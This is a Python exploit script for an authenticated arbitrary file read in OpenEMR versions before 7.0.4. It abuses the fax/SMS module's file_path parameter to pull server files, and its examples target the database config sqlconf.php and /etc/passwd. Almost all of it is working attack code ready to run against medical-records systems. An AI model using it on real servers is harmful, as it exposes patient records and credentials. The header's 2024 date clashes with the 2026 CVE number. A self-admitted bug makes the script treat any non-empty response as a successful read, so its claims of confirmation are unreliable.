#!/usr/bin/env python3
# Exploit Title: OpenEMR < 7.0.4 - Authenticated Arbitrary File Read (CVE-2026-24849)
# Date: 2024-08-01
# Exploit Author: sw33tLie
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr
# Version: < 7.0.4
# Tested on: OpenEMR 7.0.2
# CVE: CVE-2026-24849
#
# References:
#   https://github.com/openemr/openemr/security/advisories/GHSA-w6vc-hx2x-48pc
#   https://nvd.nist.gov/vuln/detail/CVE-2026-24849
#
# Usage:
#   Interactive (prompts for everything):
#     python3 exploit-CVE-2026-24849.py
#   Non-interactive:
#     python3 exploit-CVE-2026-24849.py -t http://10.10.10.10 -u admin -P pass \
#         -f /var/www/html/openemr/sites/default/sqlconf.php

import argparse
import getpass
import re
import sys

try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.exit("[-] This exploit needs the 'requests' module:  pip3 install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0"
FAXSMS = "/interface/modules/custom_modules/oe-module-faxsms/index.php"

# Method name varies across affected minor versions (disposeDoc <-> disposeDocument).
ACTIONS = ["disposeDoc", "disposeDocument"]

# An unauthenticated request is answered with a JS redirect to this path.
# (Use a narrow marker: every OpenEMR page embeds generic timeout JS.)
FAIL_MARKER = "login_screen.php?error=1"


def ask(prompt, default=None, secret=False):
    label = "%s [%s]: " % (prompt, default) if default else "%s: " % prompt
    value = getpass.getpass(label) if secret else input(label).strip()
    return value or default


def login(sess, base, site, user, password):
    """Establish an OpenEMR session in `sess`. Validity is confirmed later by an
    actual file read, so this just performs the GET (CSRF prime) + POST."""
    # 1) prime a session cookie and grab the CSRF token if the form exposes one
    r = sess.get(base + "/interface/login/login.php",
                 params={"site": site}, timeout=20, verify=False)
    m = re.search(r"csrf_token_form.*?value=[\"'](.*?)[\"']", r.text, re.S)
    csrf = m.group(1) if m else ""

    # 2) POST credentials
    sess.post(
        base + "/interface/main/main_screen.php",
        params={"auth": "login", "site": site},
        data={
            "new_login_session_management": "1",
            "authProvider": "Default",
            "authUser": user,
            "clearPass": password,
            "languageChoice": "1",
            "csrf_token_form": csrf,
        },
        headers={"User-Agent": UA},
        timeout=20,
        verify=False,
        allow_redirects=True,
    )


def read_file(sess, base, site, file_path):
    """Try each action in ACTIONS until we get a non-empty, non-login response."""
    for action in ACTIONS:
        r = sess.get(
            base + FAXSMS,
            params={
                "site": site,
                "type": "fax",
                "_ACTION_COMMAND": action,
                "file_path": file_path,
                "action": "download",
            },
            headers={"User-Agent": UA},
            timeout=20,
            verify=False,
            allow_redirects=False,
        )
        body = r.text.strip()
        # BUG: any non-empty body (including error messages) is treated as success
        if body and FAIL_MARKER not in body:
            return body
    return None


def main():
    ap = argparse.ArgumentParser(
        description="OpenEMR < 7.0.4 - Authenticated Arbitrary File Read (CVE-2026-24849)"
    )
    ap.add_argument("-t", "--target", metavar="URL",
                    help="Base URL, e.g. http://10.10.10.10:8080")
    ap.add_argument("-u", "--user", metavar="USER", help="OpenEMR username")
    ap.add_argument("-P", "--password", metavar="PASS", help="OpenEMR password")
    ap.add_argument("-s", "--site", metavar="SITE", default="default",
                    help="OpenEMR site name (default: default)")
    ap.add_argument("-f", "--file", metavar="PATH",
                    help="Remote file to read, e.g. /etc/passwd")
    args = ap.parse_args()

    print("[*] OpenEMR < 7.0.4 - Authenticated Arbitrary File Read (CVE-2026-24849)")

    base     = args.target   or ask("Target URL")
    user     = args.user     or ask("Username")
    password = args.password or ask("Password", secret=True)
    site     = args.site
    file_path = args.file    or ask("File path")

    # strip trailing slash
    base = base.rstrip("/")

    if not site:
        site = ask("Site", default="default") or "default"

    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})

    print(f"[*] Authenticating to {base} as '{user}' ...")
    login(sess, base, site, user, password)

    content = read_file(sess, base, site, file_path)
    if content is None:
        print("[-] Auth failed or file unreadable.")
        sys.exit(1)

    print("[+] Authenticated; CVE-2026-24849 file-read confirmed.")
    print(f"[+] ---------- {file_path} ----------")
    print(content)
    print("[+] --------------------------")


if __name__ == "__main__":
    main()
